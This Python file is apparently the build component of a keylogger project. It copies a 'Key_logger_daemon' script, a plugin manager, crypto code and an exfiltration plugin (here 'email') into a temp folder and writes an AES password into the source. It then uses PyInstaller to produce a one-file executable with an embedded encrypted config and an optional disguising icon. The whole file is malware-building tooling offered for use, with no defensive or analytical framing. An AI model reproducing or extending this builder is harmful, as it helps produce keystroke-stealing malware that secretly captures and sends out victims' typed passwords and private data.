import json
import os
import os.path as op
import shutil

from PyInstaller.building import makespec
from PyInstaller.__main__ import run as PIbuilder
from tempfile import TemporaryDirectory, TemporaryFile


class Builder:
    """
    store configs in configuration file
    embed config file with exe at build time

    build_spec = {
                encrypt_config="key_password",
                plugin_name="email",
                plugin_config={**config fro plugin**}
                }

    (built)
    config={
        plugin_name="plugin to use"
        plugin_config="{config for plugin}"
    }

    build process:

    make copy of cores and specified plugin to temp ->  overwrite keys in class (if used) -> compile project spec
    -> amend spec with data files -> compile exe

    """

    def __init__(self, **build_spec):
        self.build_spec = build_spec
        self.spec = TemporaryFile()
        self.__working_folder = TemporaryDirectory()
        self.paths = {"Key_logger_daemon": self.__copy_to_temp("Key_logger_daemon.py"),
                      "plugin_manager": self.__copy_to_temp("plugin_manager.py"),
                      "crypto": self.__copy_to_temp("crypto.py"),
                      "plugin_base": self.__copy_to_temp("plugins", "plugin_base.py"),
                      "plugin": self.__copy_to_temp("plugins", build_spec["plugin_name"] + ".py"),
                      "config": self.__copy_to_temp("config.json"),
                      "work": op.join(self.__working_folder.name, "work")}

        # validate config before dumping
        json.dump({"plugin_name": build_spec["plugin_name"],
                   "plugin_config": build_spec["plugin_config"] if "plugin_config" in build_spec.keys() else dict()},
                  open(self.paths["config"], "w"))

        if "key" in build_spec:  # insert config key into plugin manager source same key to encrypt byte
            self.__insert_config_key(build_spec["key"])

    def __insert_config_key(self, key):
        with open(self.paths["plugin_manager"], "rb+") as f:
            data = f.readlines()
            for index, line in enumerate(data):
                if b"_CONFIG_AES_PASSWORD: str = \"\"" in line:
                    data[index] = line.replace(b"\"\"", b'"' + key.encode() + b'"')
            f.seek(0)
            f.writelines(data)
            f.truncate()

    def __copy_to_temp(self, *paths):
        destination = op.join(self.__working_folder.name, *paths)
        os.makedirs(op.dirname(destination), exist_ok=True)
        shutil.copy(op.join(*paths), destination)
        return destination

    def __make_spec(self):
        # change to def for readability
        check_in_build_spec = lambda key: self.build_spec[key] if key in self.build_spec.keys() else None
        makespec.main([self.paths["Key_logger_daemon"]],
                      specpath=self.spec.name,  # writes spec to temp
                      onefile=True,
                      console=True,
                      pathex=[self.__working_folder.name],
                      datas=[(self.paths["config"], ".")],
                      key=check_in_build_spec("key"),
                      icon_file=check_in_build_spec("icon_file"),
                      hiddenimports=["plugins." + self.build_spec["plugin_name"], "plugins." + "plugin_base"])

    def build(self):
        self.__make_spec()
        PIbuilder(['--distpath', self.build_spec["out_path"], self.spec.name])


Builder(plugin_name="email", out_path="C:\\Users\\me\\Projects\\Python\\KeyLoggerBuildable").build()
